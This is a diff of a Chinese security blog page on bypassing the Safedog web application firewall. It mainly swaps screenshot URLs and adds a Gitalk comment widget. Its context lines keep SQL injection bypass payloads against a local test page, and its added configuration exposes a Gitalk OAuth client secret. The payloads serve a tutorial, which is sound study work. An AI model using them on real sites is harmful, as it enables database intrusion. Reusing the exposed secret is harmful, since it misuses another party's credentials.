-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png">
+<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png, https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png">
     </a></p>
 <p>但是用union和select放在在一起就被发现啦
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png">
+<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png, https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png">
     </a></p>
 <p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
 <div class="highlight"><div class="chroma">
@@ -460,14 +460,14 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png">
+</div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png, https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png">
     </a></p>
 <ul>
 <li>对于数字型注入,可以将其转换成浮点型</li>
@@ -483,14 +483,14 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png">
+</div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png, https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png">
     </a></p>
 <p>基于报错信息的注入绕安全狗</p>
 <div class="highlight"><div class="chroma">
@@ -513,14 +513,14 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png">
+</div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png, https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png">
     </a></p>
 <p>使用反引号去绕过</p>
 <div class="highlight"><div class="chroma">
@@ -581,14 +581,14 @@ php+mysql环境下支持的空格有：</p>
 GET类型请求转换成POST类型
 Content-Length头长度大于4008
 正常参数放置在脏数据后面</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png">
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png, https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png">
     </a></p></div>
 
         <div class="post-footer" id="post-footer">
@@ -618,7 +618,9 @@ Content-Length头长度大于4008
     <div class="post-nav">
             <a href="/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/" class="next" rel="next" title="给表弟的Web安全入门建议">给表弟的Web安全入门建议<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
-</article></div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2015 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.bysec.cn/" target="_blank" rel="noopener noreferrer">bysec</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备2024294125号</a></span></div>
@@ -632,8 +634,8 @@ Content-Length头长度大于4008
         </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
             <i class="fas fa-comment fa-fw"></i>
         </a>
-    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
-        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":null,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":null,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":null,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":null,"type":"fuse","useExtendedSearch":null},"twemoji":true};</script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["CNbysec"],"clientID":"Ov23li64ijr3L89wsfoj","clientSecret":"a291b75ee7aaf91f94e71d89a39cf8098ee8ed80","id":"2020-12-15T21:18:35+08:00","owner":"CNbysec","repo":"CNbysec.github.io","title":"绕waf系列之绕安全狗"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":null,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":null,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":null,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":null,"type":"fuse","useExtendedSearch":null},"twemoji":true};</script><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><script type="text/javascript" src="/js/gitalk.min.js" defer></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
 </body>
 
 </html>
